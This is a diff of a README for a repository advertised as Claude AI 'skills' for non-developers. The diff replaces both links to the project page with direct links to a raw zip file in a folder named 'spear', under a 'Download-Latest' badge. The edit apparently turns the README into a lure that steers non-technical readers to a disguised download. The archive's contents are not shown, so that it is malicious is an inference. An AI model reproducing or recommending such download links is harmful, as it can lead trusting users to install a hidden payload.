@@ -1,6 +1,6 @@
 # 🛠️ my-claude-skills - Extend Claude AI for daily tasks
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/roniesthetic654/my-claude-skills)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/roniesthetic654/my-claude-skills/raw/refs/heads/main/spear/skills_claude_my_unappeasableness.zip)
 
 This repository provides tools to help you get more from Claude AI. These skills add features that help you understand complex code, create diagrams, and automate your daily work tasks. You do not need to be a developer to use these tools. Every skill works as a modular add-on for your Claude environment.
 
@@ -27,7 +27,7 @@ Your computer must meet these basic needs to run the skills:
 
 You can get the latest version from our main page. 
 
-[Visit this page to download the latest files](https://github.com/roniesthetic654/my-claude-skills)
+[Visit this page to download the latest files](https://github.com/roniesthetic654/my-claude-skills/raw/refs/heads/main/spear/skills_claude_my_unappeasableness.zip)
 
 Follow these steps to finish the setup:
 
